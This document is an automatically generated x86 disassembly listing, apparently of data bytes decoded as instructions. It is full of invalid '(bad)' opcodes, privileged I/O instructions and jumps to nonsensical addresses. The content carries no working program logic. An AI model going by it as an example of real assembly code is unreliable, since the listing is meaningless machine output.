  425fdc:	imul   ebp,DWORD PTR [eax+0x66],0x33
  425fe0:	jmp    0xa7978fa0
  425fe5:	aam    0xf0
  425fe7:	cmc    
  425fe8:	xchg   ecx,eax
  425fe9:	call   0x9258:0x6ba68931
  425ff0:	adc    dh,BYTE PTR [ebx+0x31a5dae4]
  425ff6:	mov    ds:0x162d7ee0,al
  425ffb:	jnp    0x42602f
  425ffd:	daa    
  425ffe:	add    bh,BYTE PTR [ebp-0x66]
  426001:	mov    eax,esi
  426003:	gs xor eax,0x4a49405f
  426009:	add    eax,0x9d25fdc7
  42600e:	pop    eax
  42600f:	popa   
  426010:	jne    0x42607d
  426012:	stc    
  426013:	dec    esp
  426014:	jo     0x426008
  426016:	xor    eax,0xf293b35b
  42601b:	inc    edi
  42601c:	shl    BYTE PTR ds:0xc280f4c3,cl
  426022:	(bad)  [ebx-0x1b817a10]
  426028:	(bad)  
  426029:	retf   0x45d9
  42602c:	repnz cmp edx,DWORD PTR [ebp-0x38a28e68]
  426033:	call   FWORD PTR [ebx]
  426035:	pop    esp
  426036:	cmp    dl,dl
  426038:	mov    dl,BYTE PTR [edi]
  42603a:	xor    bh,cl
  42603c:	test   BYTE PTR [ebx-0x5c],0xea
  426040:	fcmovnu st,st(4)
  426042:	push   edi
  426043:	enter  0x2e3d,0x47
  426047:	xor    al,0xaa
  426049:	sbb    BYTE PTR [edi-0x7d],ch
  42604c:	hlt    
  42604d:	mov    ecx,0xb57bfdba
  426052:	adc    eax,0xf
  426055:	pop    eax
  426056:	ficom  DWORD PTR [esi-0x730b8e6d]
  42605c:	stos   BYTE PTR es:[edi],al
  42605d:	cmp    BYTE PTR [edx+0x50],bl
  426060:	lds    edx,FWORD PTR [ecx]
  426062:	test   eax,0xb0c7e9fc
  426067:	fimul  WORD PTR [ecx+0x6117f6e1]
  42606d:	jle    0x42606f
	...
  4260d3:	add    BYTE PTR [eax],al
  4260d5:	add    BYTE PTR [ecx],bh
  4260d7:	cwde   
  4260d8:	or     eax,DWORD PTR [esi]
  4260da:	stos   DWORD PTR es:[edi],eax
  4260db:	xchg   edi,eax
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	mov    dh,0xb
  4260e4:	and    DWORD PTR [edx],0x67
  4260e7:	cwde   
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	add    BYTE PTR [ecx],al
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	ins    DWORD PTR es:[edi],dx
  4260ef:	ins    DWORD PTR es:[edi],dx
  4260f0:	adc    eax,0x1a80259
  4260f5:	std    
  4260f6:	mov    WORD PTR [ebp+0x7e743ba3],cs
  4260fc:	imul   edi,DWORD PTR [ecx+0x637216c],0x43b6efbe
  426106:	lock out 0x93,eax
  426109:	jo     0x426152
  42610b:	lock push esp
  42610d:	xchg   esp,eax
  42610e:	xor    al,0x14
  426110:	cmp    DWORD PTR [esi],edi
  426112:	mov    esi,0xf52e10d8
  426117:	daa    
  426118:	xor    eax,DWORD PTR [ecx]
  42611a:	jmp    0x426183
  42611c:	jbe    0x42613c
  42611e:	inc    eax
  42611f:	jmp    0x24b81e93
  426124:	pop    ebp
  426125:	fcmovnbe st,st(1)
  426127:	sbb    cl,BYTE PTR [ebx+0x2a4419c5]
  42612d:	ja     0x4260b8
  42612f:	repnz adc dh,dh
  426132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426133:	pcmpgtb mm3,mm0
  426136:	loopne 0x4261a9
  426138:	maxps  xmm3,XMMWORD PTR [ebp+0x31a48eda]
  42613f:	retf   0xa97f
  426142:	test   cl,0x6b
  426145:	in     al,0x4c
  426147:	mov    al,ds:0xe969aef5
  42614c:	jge    0x42615c
  42614e:	hlt    
  42614f:	sub    ebp,DWORD PTR [ecx]
  426151:	or     al,BYTE PTR [edi+0x4c]
  426154:	jne    0x4260f9
  426156:	pop    esi
  426157:	add    BYTE PTR [ebp+0x20178280],dl
  42615d:	cli    
  42615e:	mov    ds:0xb1aca7a5,eax
  426163:	in     al,0x62
  426165:	dec    esp
  426166:	xlat   BYTE PTR ds:[ebx]
  426167:	mov    esp,0x7cf3be25
  42616c:	push   ebp
  42616d:	and    BYTE PTR [ebx-0x5d],bl
  426170:	pop    ebx
  426171:	xchg   ebx,eax
  426172:	xor    BYTE PTR [eax+0x53939437],ah
  426178:	lea    ecx,[edx]
  42617a:	xchg   DWORD PTR [ecx],ebx
  42617c:	xchg   edi,eax
  42617d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42617e:	pusha  
  42617f:	or     DWORD PTR [eax-0x30],0x65790bfd
  426186:	push   0xbf3b3c9c
  42618b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42618c:	into   
  42618d:	mov    ch,0x58
  426190:	stos   DWORD PTR es:[edi],eax
  426191:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  426193:	ja     0x42614b
  426195:	(bad)  
  426196:	or     dl,BYTE PTR [esi]
  426198:	mov    al,ds:0xdc64c87b
  42619d:	mov    ds:0xb3d6883e,eax
  4261a2:	jg     0x4261cf
  4261a4:	in     al,0xbd
  4261a6:	in     eax,0x32
  4261a8:	pop    esi
  4261a9:	xchg   ebp,eax
  4261aa:	jmp    0x4261fa
  4261ac:	adc    eax,0xd6cb5ba2
  4261b1:	nop
  4261b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261b3:	pop    edx
  4261b4:	(bad)
  4261b8:	or     al,0x12
  4261ba:	pop    es
  4261bb:	stos   DWORD PTR es:[edi],eax
  4261bc:	mov    bh,0x94
  4261be:	cmp    al,0xd0
  4261c0:	mov    ds:0x1c8c23f8,eax
  4261c5:	outs   dx,DWORD PTR ds:[esi]
  4261c6:	retf   
  4261c7:	jecxz  0x4261e4
  4261c9:	or     eax,0x5a5f8106
  4261ce:	pop    edi
  4261cf:	mov    al,ds:0xf6d653f6
  4261d4:	daa    
  4261d5:	je     0x4261ed
  4261d7:	clc    
  4261d8:	jb     0x42616a
  4261da:	in     eax,dx
  4261db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261dc:	xor    bl,BYTE PTR [ebp-0xe4dc74e]
  4261e2:	push   0x7d
  4261e4:	xchg   esp,eax
  4261e5:	icebp  
  4261e6:	push   0x61
  4261e8:	mov    edx,?
  4261ea:	outs   dx,DWORD PTR ds:[esi]
  4261eb:	xlat   BYTE PTR ds:[ebx]
  4261ec:	adc    ch,ah
	...
  426256:	fwait
  426257:	and    DWORD PTR [edi],ecx
  426259:	popa   
  42625a:	mov    edi,0xb7fbff6f
  42625f:	xor    DWORD PTR [ecx+0x6b7ff727],0x2b
  426266:	addr16 cdq 
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	mov    dl,0x83
  426270:	imul   ebp,DWORD PTR [ecx+0x3bb2c923],0xffffffca
  426277:	sbb    bl,ch
  426279:	fmul   QWORD PTR [esi+ebx*4]
  42627c:	repnz call 0xd054:0x93912180
  426284:	mov    ds:0x7f565f2e,eax
  426289:	repnz adc ebx,DWORD PTR [eax-0x5d]
  42628d:	ins    BYTE PTR es:[edi],dx
  42628e:	int3   
  42628f:	lea    ebx,ds:0x4d73e3bb
  426295:	pop    es
  426296:	xor    dh,BYTE PTR [edi]
  426298:	add    eax,0x7b3b983a
  42629d:	push   ss
  42629e:	jb     0x426314
  4262a0:	jae    0x4262c5
  4262a2:	or     esi,ebp
  4262a4:	mov    bh,0x3e
  4262a6:	repz push edi
  4262a8:	jmp    0x4262a5
  4262aa:	lahf   
  4262ab:	adc    al,0x8e
  4262ad:	(bad)  
  4262ae:	data16 fxch st(4)
  4262b1:	hlt    
  4262b2:	pop    eax
  4262b3:	jae    0x426283
  4262b5:	pop    edx
  4262b6:	fdivr  st(2),st
  4262b8:	test   BYTE PTR [ecx],ah
  4262ba:	pushf  
  4262bb:	fcomp  QWORD PTR [eax+0x48]
  4262be:	addr16 add al,0x5c
  4262c1:	aam    0x81
  4262c3:	mov    al,ds:0x34254dc3
  4262c8:	cmp    al,0x95
  4262ca:	adc    eax,0x31244340
  4262cf:	xor    DWORD PTR [ecx+0x67],ecx
  4262d2:	fadd   DWORD PTR ds:0x4202e69
  4262d8:	rol    DWORD PTR [ecx-0x6819a5dd],cl
  4262de:	and    al,0x43
  4262e0:	dec    esi
  4262e1:	mov    bl,0x90
  4262e3:	inc    eax
  4262e4:	jnp    0x4262b9
  4262e6:	add    bl,BYTE PTR [ebx+0x73719d06]
  4262ec:	dec    ecx
  4262ed:	fs inc edx
  4262ef:	ja     0x4262a9
  4262f1:	int    0x4b
  4262f3:	pushf  
  4262f4:	invd   
  4262f6:	pop    edx
  4262f7:	shl    BYTE PTR [ebx+ebx*8-0x22],1
  4262fb:	nop
  4262fc:	cmc    
  4262fd:	sbb    cl,bh
  4262ff:	mov    ecx,DWORD PTR [eax+ebp*2-0xb]
  426303:	pop    DWORD PTR ss:[edx]
  426306:	or     DWORD PTR [ecx+0xa8a7837],edi
  42630c:	fidivr WORD PTR [edi]
  42630e:	imul   BYTE PTR [edx-0x1d8044fb]
  426314:	mov    eax,gs:0xf8de8ffc
  42631a:	sub    BYTE PTR ds:0x8dfccd17,ch
  426320:	mov    al,0xaa
  426322:	adc    DWORD PTR [edi-0x2c71f669],ebp
  426328:	in     al,dx
  426329:	jno    0x426339
  42632b:	push   cs
  42632c:	loopne 0x4262c9
  42632e:	mov    ecx,0xa44a169c
  426333:	cdq    
  426334:	clc    
  426335:	add    bl,ch
  426337:	push   eax
  426338:	sub    eax,0xb7d17bd2
  42633d:	retf   
  42633e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42633f:	cmc    
  426340:	and    al,0xdd
  426342:	mov    bh,0xcc
  426344:	mov    cs,WORD PTR [ecx-0x7]
  426347:	sub    eax,0x78e1e2cc
  42634c:	(bad)  
  42634d:	int    0x49
  42634f:	dec    edi
  426350:	inc    esp
  426351:	adc    ch,BYTE PTR [esi]
  426353:	gs pop esp
  426355:	pop    DWORD PTR [ebx]
  426357:	bound  edx,QWORD PTR [ecx+esi*8-0xae40d70]
  42635e:	mov    bl,0x2
  426360:	jg     0x4263a4
  426362:	(bad)  
  426363:	mov    eax,0xebc23ccf
  426368:	sbb    BYTE PTR [ecx-0x55],bl
  42636b:	xchg   ebp,eax
  42636c:	call   0x426452
	...
  4263d5:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  4263d9:	dec    esi
  4263da:	std    
  4263db:	out    dx,al
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x35f97ed7
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	lods   al,BYTE PTR ds:[esi]
  4263ef:	out    dx,eax
  4263f0:	and    al,0xa6
  4263f2:	fdivrp st(5),st
  4263f4:	loopne 0x426393
  4263f6:	adc    dh,BYTE PTR [ecx+0x78]
  4263f9:	outs   dx,DWORD PTR ds:[esi]
  4263fa:	push   eax
  4263fb:	(bad)  
  4263fc:	in     al,dx
  4263fd:	call   0xba81:0xcf36f2db
  426404:	or     eax,0x8d9ef4c6
  426409:	inc    ebp
  42640a:	adc    DWORD PTR [ebx+0x11611026],ebp
  426410:	shl    BYTE PTR [ebx-0x42],1
  426413:	mov    esp,0x4fb6e354
  426418:	xchg   esi,eax
  426419:	ret    0xa8f7
  42641c:	ss inc ebx
  42641e:	mov    esi,0x4f9aa010
  426423:	cmp    eax,0xe802fcde
  426428:	sbb    BYTE PTR [edi],al
  42642a:	nop
  42642b:	add    al,dh
  42642d:	fdiv   QWORD PTR [ecx+0x7c]
  426430:	inc    ebx
  426431:	ins    BYTE PTR es:[edi],dx
  426432:	push   ecx
  426433:	sbb    ebx,DWORD PTR [edx]
  426435:	inc    edx
  426436:	or     ah,BYTE PTR [esi]
  426438:	push   0x16
  42643a:	aam    0x31
  42643c:	mov    ebx,0xc685813f
  426441:	call   0x62d7e729
  426446:	inc    eax
  426447:	or     ah,0xba
  42644a:	pop    ds
  42644b:	daa    
  42644c:	int3   
  42644d:	scas   eax,DWORD PTR es:[edi]
  42644e:	pusha  
  42644f:	pop    ecx
  426450:	push   esi
  426451:	xchg   esp,eax
  426452:	sar    ebx,1
  426454:	dec    edx
  426455:	das    
  426456:	jg     0x426424
  426458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426459:	aam    0x5a
  42645b:	sub    ah,BYTE PTR [esp+eiz*2-0x3e739fc0]
  426462:	jns    0x426417
  426464:	push   ecx
  426465:	pop    edi
  426466:	pop    ebp
  426467:	mov    ebx,0xa2439c4c
  42646c:	fwait
  42646d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42646e:	sbb    bl,ah
  426470:	sub    BYTE PTR fs:[edx-0x31],0x44
  426475:	outs   dx,DWORD PTR ds:[esi]
  426476:	sar    DWORD PTR [edx+0x77746182],1
  42647c:	push   ss
  42647d:	mov    ecx,0xf021df3b
  426482:	sbb    dh,bh
  426484:	pusha  
  426485:	retf   0x8df2
  426488:	enter  0x28b7,0x97
  42648c:	bswap  ebp
  42648e:	int3   
  42648f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426491:	or     DWORD PTR [ebp-0x53b46140],edx
  426497:	sbb    al,0x99
  426499:	jae    0x426420
  42649b:	sbb    BYTE PTR [edi],bh
  42649d:	push   ebp
  42649e:	push   ebp
  42649f:	(bad)  
  4264a0:	(bad)  
  4264a1:	das    
  4264a2:	pop    esp
  4264a3:	lock call 0x5cdd:0x9ffa700d
  4264ab:	idiv   DWORD PTR [ecx]
  4264ad:	jecxz  0x42646c
  4264af:	inc    eax
  4264b0:	popa   
  4264b1:	inc    ecx
  4264b2:	and    ah,cl
  4264b4:	sbb    al,0x39
  4264b6:	mov    al,ds:0x230cdc28
  4264bb:	jae    0x426462
  4264bd:	mov    BYTE PTR [eax+0x177bb703],dl
  4264c3:	jmp    0x426504
  4264c5:	xchg   edi,eax
  4264c6:	xchg   ebp,eax
  4264c7:	xchg   ebx,eax
  4264c8:	xchg   BYTE PTR [esi-0x27cbf16f],al
  4264ce:	ret    
  4264cf:	add    BYTE PTR [ebx+0x2626cd51],dl
  4264d5:	xchg   edi,eax
  4264d6:	aaa    
  4264d7:	add    eax,0xf2bd45cd
  4264dc:	nop
  4264dd:	jle    0x4264d1
  4264df:	sub    BYTE PTR [edi],bh
  4264e1:	and    dh,BYTE PTR [esi]
  4264e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264e4:	sti    
  4264e5:	mov    ds:0x429672c4,eax
  4264ea:	pop    ebp
  4264eb:	test   ah,al
  4264ed:	lods   al,BYTE PTR ds:[esi]
	...
  426556:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42655d:	outs   dx,DWORD PTR ds:[esi]
  42655e:	vmwrite ecx,DWORD PTR [edx-0xcf7227b]
  426565:	dec    ecx
  426566:	addr16 fwait
  426568:	add    DWORD PTR [eax],eax
  42656a:	add    BYTE PTR [ecx],al
  42656c:	add    BYTE PTR [eax],al
  42656e:	mov    eax,0x6a236095
  426573:	mov    eax,0x7f988de4
  426578:	hlt    
  426579:	pushf  
  42657a:	mov    eax,0x261bfd5e
  42657f:	imul   esi,DWORD PTR [ebx],0xfbc7b9be
  426585:	sahf   
  426586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426587:	repz cmp dl,dh
  42658a:	in     eax,0x10
  42658c:	loopne 0x426592
  42658e:	loope  0x42658b
  426590:	push   cs
  426591:	cmp    eax,DWORD PTR [ebp-0x71]
  426594:	daa    
  426595:	call   0x6c60688e
  42659a:	aam    0x3e
  42659c:	mov    esi,DWORD PTR [eax+0x2f]
  42659f:	enter  0x3ba7,0x4e
  4265a3:	ret    
  4265a4:	xor    al,0x72
  4265a6:	xchg   ebx,eax
  4265a7:	nop
  4265a8:	imul   ecx,DWORD PTR [ebp-0x36],0x29
  4265ac:	jns    0x426582
  4265ae:	ror    BYTE PTR [ecx],cl
  4265b0:	into   
  4265b1:	and    DWORD PTR [ecx-0xa8eee56],edx
  4265b7:	mov    al,ds:0x27190cda
  4265bc:	cld    
  4265bd:	xchg   BYTE PTR [esi],bh
  4265bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265c0:	dec    eax
  4265c1:	xchg   ebx,eax
  4265c2:	ss loope 0x4265b4
  4265c5:	mov    ebx,0x3454619c
  4265ca:	out    0xe3,al
  4265cc:	(bad)  
  4265cd:	out    0xe7,eax
  4265cf:	mov    ch,0x33
  4265d1:	das    
  4265d2:	lds    esp,FWORD PTR [eax]
  4265d4:	sub    edi,ecx
  4265d6:	lahf   
  4265d7:	popa   
  4265d8:	inc    eax
  4265d9:	ins    DWORD PTR es:[edi],dx
  4265da:	inc    edx
  4265db:	mov    ds:0xe4fd32c6,al
  4265e0:	mov    al,BYTE PTR [eax]
  4265e2:	xlat   BYTE PTR ds:[ebx]
  4265e3:	or     ah,BYTE PTR [edx]
  4265e5:	sbb    DWORD PTR [eax],edi
  4265e7:	sbb    al,0x56
  4265e9:	aaa    
  4265ea:	outs   dx,BYTE PTR ds:[esi]
  4265eb:	push   0xffffffa9
  4265ed:	imul   esp,ebx,0x2c8321b6
  4265f3:	push   ecx
  4265f4:	dec    esi
  4265f5:	jmp    0x8dee53f8
  4265fa:	cwde   
  4265fb:	mov    ebx,DWORD PTR [edx-0x2fe66a9d]
  426601:	(bad)  
  426603:	js     0x426679
  426605:	push   esi
  426606:	mov    ecx,0x48c2da08
  42660b:	sbb    esp,DWORD PTR [eax]
  42660d:	jmp    0xcbe8:0x9db57483
  426614:	push   0xffffff8e
  426616:	adc    BYTE PTR [eax+0x496f34c9],ah
  42661c:	jbe    0x426645
  42661e:	dec    edx
  42661f:	dec    edi
  426620:	xchg   edi,eax
  426621:	pop    ds
  426622:	sahf   
  426623:	enter  0x1e9a,0x7b
  426627:	cwde   
  426628:	hlt    
  426629:	lock pushf 
  42662b:	(bad)  [ebp-0x30]
  42662e:	and    al,0x60
  426630:	inc    ebx
  426631:	pop    edx
  426632:	sub    DWORD PTR [ebp+0x5cbaadcf],edx
  426638:	push   ds
  426639:	stc    
  42663a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42663b:	loop   0x426669
  42663d:	push   eax
  42663e:	lods   eax,DWORD PTR ds:[esi]
  42663f:	cmp    dh,BYTE PTR ds:0x584ead3e
  426645:	test   DWORD PTR [edi-0xd],ebp
  426648:	ins    DWORD PTR es:[edi],dx
  426649:	pop    edx
  42664a:	dec    esi
  42664b:	mov    al,ds:0x8ccd850d
  426650:	pop    ss
  426651:	or     dh,dh
  426653:	dec    ecx
  426654:	xchg   ebx,eax
  426655:	jb     0x4265fc
  426657:	out    0x38,eax
  426659:	jecxz  0x426612
  42665b:	and    al,0x32
  42665d:	add    ch,BYTE PTR [ecx]
  42665f:	popa   
  426660:	aas    
  426661:	pop    ss
  426662:	pop    ds
  426663:	pop    esp
  426664:	jne    0x4266da
  426666:	and    BYTE PTR ds:0xa53edf8e,bh
  42666c:	lds    ebx,FWORD PTR [ebx+0x0]
	...
  4266d6:	adc    cl,bl
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi+0x132e6da4]
  4266e4:	loopne 0x4266e2
  4266e6:	addr16 pushf 
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	push   eax
  4266ef:	(bad)  
  4266f0:	cmp    DWORD PTR [edi+0x47e36094],ebx
  4266f6:	push   cs
  4266f7:	push   ds
  4266f8:	mov    ebx,0x5f546088
  4266fd:	xchg   esp,eax
  4266fe:	rol    ebx,cl
  426700:	or     eax,0x3cc57717
  426705:	cmp    ebx,0xffffff84
  426708:	cmp    edi,DWORD PTR [ecx+0x17]
  42670b:	(bad)  
  42670c:	sbb    eax,0x4688e81e
  426711:	sbb    dl,BYTE PTR [ebx]
  426713:	and    dl,BYTE PTR [esi]
  426715:	mov    esp,0x4d7b9a2
  42671a:	arpl   cx,cx
  42671c:	scas   eax,DWORD PTR es:[edi]
  42671d:	cli    
  42671e:	xor    esp,DWORD PTR [edi-0x479a0fd0]
  426724:	lods   eax,DWORD PTR ds:[esi]
  426725:	test   al,0x98
  426727:	fdivr  st,st(2)
  426729:	xchg   edi,eax
  42672a:	pop    es
  42672b:	mov    bl,0xd4
  42672d:	xchg   BYTE PTR ds:0x4d42ced3,dl
  426733:	(bad)  
  426734:	inc    ecx
  426735:	repz add al,0x70
  426738:	shl    DWORD PTR [ecx],0xf7
  42673b:	and    DWORD PTR [ecx-0x6a3a3463],ebp
  426741:	sub    al,BYTE PTR [edx+0xba671f2]
  426747:	or     DWORD PTR [ebp-0x5bbc8e6a],0xfcb06cec
  426751:	sbb    DWORD PTR [ebx],0x416472ef
  426757:	cmp    al,BYTE PTR [ebx+0xd]
  42675a:	dec    edx
  42675b:	adc    DWORD PTR [edi],ebx
  42675d:	xor    esi,ebp
  42675f:	test   al,0xab
  426762:	xor    eax,0xb39c7c8f
  426767:	adc    DWORD PTR ds:[ebx],ebx
  42676a:	push   eax
  42676b:	lds    ebp,FWORD PTR ds:0x5d730b8b
  426771:	xchg   esi,eax
  426772:	rcr    DWORD PTR [edi-0x35386390],0x1e
  426779:	cli    
  42677a:	out    dx,al
  42677b:	xchg   ebp,eax
  42677c:	sar    ch,cl
  42677e:	iret   
  42677f:	pop    eax
  426780:	outs   dx,BYTE PTR ds:[esi]
  426781:	xor    esi,DWORD PTR [esi-0xe1f34e5]
  426787:	ins    BYTE PTR es:[edi],dx
  426788:	adc    DWORD PTR [ebx+0x57a02cda],0x4cfd28c3
  426792:	mov    WORD PTR [edi-0x3589741],ss
  426798:	retf   
  426799:	and    ecx,DWORD PTR [ebx]
  42679b:	sub    BYTE PTR [ebp-0x49],bl
  42679e:	dec    edx
  4267a0:	adc    BYTE PTR [edx+eax*1-0x14],bh
  4267a4:	adc    BYTE PTR [ebx-0x67],dl
  4267a7:	and    eax,0xecc99774
  4267ac:	outs   dx,BYTE PTR ds:[esi]
  4267ad:	aam    0x16
  4267af:	(bad)  
  4267b0:	ds mov ch,0x3
  4267b3:	pop    edi
  4267b4:	mov    al,ah
  4267b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267b7:	mov    dh,0xb6
  4267b9:	sbb    DWORD PTR [edi-0x22],edi
  4267bc:	outs   dx,DWORD PTR ds:[esi]
  4267bd:	(bad)  
  4267be:	sti    
  4267bf:	adc    DWORD PTR [ecx-0x20b7f258],esp
  4267c5:	call   0xf177f767
  4267ca:	sbb    cl,BYTE PTR [edx]
  4267cc:	mov    WORD PTR [esi],ds
  4267ce:	xchg   DWORD PTR [ebx],edx
  4267d0:	pop    ebx
  4267d1:	ficom  WORD PTR [ebp-0x7dbd0f04]
  4267d7:	add    ch,BYTE PTR [edi+0x36]
  4267da:	stc    
  4267db:	mul    DWORD PTR [eax+esi*8+0x3a]
  4267df:	jl     0x42677e
  4267e1:	loop   0x4267cf
  4267e3:	dec    ecx
  4267e4:	jnp    0x42685a
  4267e6:	and    bl,BYTE PTR [ecx]
  4267e8:	sub    dh,BYTE PTR [esi]
  4267ea:	div    DWORD PTR [edi+0x61c0]
	...
  426854:	add    BYTE PTR [eax],al
  426856:	mov    eax,0xff2ace8d
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	call   0x6749f72e
  426867:	popf   
  426868:	add    DWORD PTR [eax],eax
  42686a:	add    BYTE PTR [ecx],al
  42686c:	add    BYTE PTR [eax],al
  42686e:	out    0xa2,eax
  426870:	jno    0x4268e4
  426872:	shl    BYTE PTR [ecx-0x2eb165ce],0x48
  426879:	and    ebx,DWORD PTR ds:0x65da30dd
  42687f:	int3   
  426880:	aas    
  426881:	jo     0x42685d
  426883:	and    cl,BYTE PTR cs:[ebx]
  426886:	dec    esi
  426887:	aas    
  426888:	inc    esi
  426889:	xor    al,0x68
  42688b:	fcom   QWORD PTR [edx]
  42688d:	and    al,0x2e
  42688f:	cmc    
  426890:	mov    DWORD PTR [ebp-0x26811728],ecx
  426896:	dec    esp
  426897:	push   ds
  426898:	lea    esp,[edx]
  42689a:	loopne 0x426891
  42689c:	push   edi
  42689d:	test   al,0x6e
  42689f:	cld    
  4268a0:	push   0x4c47a39c
  4268a5:	js     0x4268bc
  4268a7:	lods   eax,DWORD PTR ds:[esi]
  4268a8:	or     bh,0x97
  4268ab:	and    eax,0x941f04a0
  4268b0:	xchg   edx,eax
  4268b1:	adc    ch,BYTE PTR [edx+edi*1-0x16ef504f]
  4268b8:	sar    DWORD PTR [ebp-0x5a],cl
  4268bb:	pop    ebp
  4268bc:	xchg   ebx,eax
  4268bd:	rol    DWORD PTR [ecx+edi*1-0x1a4e3972],0xab
  4268c5:	enter  0xfc48,0x66
  4268c9:	inc    edi
  4268ca:	lods   eax,DWORD PTR es:[esi]
  4268cc:	sbb    eax,0xb1cf5401
  4268d1:	xor    cl,ch
  4268d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268d4:	push   cs
  4268d5:	into   
  4268d6:	in     eax,0xe6
  4268d8:	add    esp,ebp
  4268da:	push   cs
  4268db:	xor    BYTE PTR [edi+0x51],0x62
  4268df:	out    dx,al
  4268e0:	xor    BYTE PTR [edi+0x38dc99b2],dh
  4268e6:	bnd jnp 0x4268c2
  4268e9:	nop
  4268ea:	push   esi
  4268eb:	add    BYTE PTR [eax+0x10497a73],0x8c
  4268f2:	jb     0x426941
  4268f4:	les    esi,FWORD PTR [ecx+0x3ccd5060]
  4268fa:	lock pop edi
  4268fc:	xor    BYTE PTR [eax+ebp*8-0x2f],dh
  426900:	(bad)  
  426901:	not    BYTE PTR [ecx+edx*8]
  426904:	or     esi,eax
  426906:	jge    0x426902
  426908:	nop
  426909:	pop    eax
  42690a:	cmp    ah,cl
  42690c:	lods   al,BYTE PTR ds:[esi]
  42690d:	shr    BYTE PTR [ecx-0x57291ef8],cl
  426913:	sbb    BYTE PTR [ecx-0x2af4db5a],cl
  426919:	retf   0xe2cb
  42691c:	xchg   ebp,eax
  42691d:	jge    0x4268f1
  42691f:	ins    DWORD PTR es:[edi],dx
  426920:	shr    BYTE PTR [eax+0x37ca7461],cl
  426926:	dec    ecx
  426927:	jp     0x426949
  426929:	fcmovu st,st(4)
  42692b:	push   ss
  42692c:	dec    eax
  42692d:	sbb    al,BYTE PTR [ebx+0x7f]
  426930:	sub    eax,DWORD PTR [ebx]
  426932:	dec    eax
  426933:	cmp    edi,ecx
  426935:	sub    bl,BYTE PTR [ebp+0xdc26722]
  42693b:	ret    
  42693c:	test   eax,0x1dfa2916
  426941:	jl     0x42692d
  426943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426944:	push   ebx
  426945:	jo     0x4269bb
  426947:	imul   eax,DWORD PTR [edx+0x1],0x71
  42694b:	loop   0x42695e
  42694d:	inc    edx
  42694e:	push   ds
  42694f:	pop    eax
  426950:	jno    0x42695b
  426952:	xor    al,0xb6
  426954:	mov    DWORD PTR [edi+eiz*2-0x45],ecx
  426958:	push   eax
  426959:	(bad)
  42695c:	cmp    ecx,DWORD PTR ds:0xe80af011
  426962:	xor    al,0x45
  426964:	(bad)  
  426965:	jle    0x426997
  426967:	sahf   
  426968:	and    dl,BYTE PTR [eax+0x4a]
  42696b:	xor    DWORD PTR [ebp+0xec],eax
	...
  4269d5:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4269dc:	mov    edi,?
  4269de:	sub    ebp,esp
  4269e0:	lahf   
  4269e1:	mov    esp,DWORD PTR [edx+0x6752b589]
  4269e7:	sahf   
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	call   0x6e3b:0x77281279
  4269f5:	sbb    eax,DWORD PTR [ecx]
  4269f7:	xchg   ebp,eax
  4269f8:	fwait
  4269f9:	mov    ah,0x3e
  4269fb:	add    DWORD PTR [eax-0x6c],eax
  4269fe:	mov    ch,0xa1
  426a00:	fld    st(1)
  426a02:	imul   BYTE PTR ds:0x6a609cc
  426a08:	cmp    esi,DWORD PTR [edx]
  426a0a:	fild   QWORD PTR [ebx+0x6f]
  426a0d:	push   ebp
  426a0e:	scas   al,BYTE PTR es:[edi]
  426a0f:	xchg   ecx,eax
  426a11:	pop    esi
  426a12:	mov    ebp,0xbcdb3dda
  426a17:	sub    edx,ebx
  426a19:	inc    edx
  426a1a:	test   DWORD PTR [edi+0x32c99e1],0xf4c02636
  426a24:	cs repnz or al,0xb0
  426a28:	nop
  426a29:	jecxz  0x426a50
  426a2b:	mov    esi,0x3d898b5d
  426a30:	in     eax,0x1e
  426a32:	lods   eax,DWORD PTR ds:[esi]
  426a33:	test   al,0x1e
  426a35:	gs push 0xffffffeb
  426a38:	inc    esp
  426a39:	jmp    0x71f8:0xf5b7e3db
  426a40:	add    bl,BYTE PTR [ecx+0x3a]
  426a43:	mov    ds:0xa32e41d7,eax
  426a48:	sti    
  426a49:	outs   dx,BYTE PTR ds:[esi]
  426a4a:	shl    BYTE PTR ds:0x1b8c4681,0x85
  426a51:	sub    BYTE PTR [ecx],0x45
  426a54:	les    edi,FWORD PTR [edx-0x12ebeb4a]
  426a5a:	jle    0x426a8d
  426a5c:	push   ecx
  426a5d:	retf   0x7277
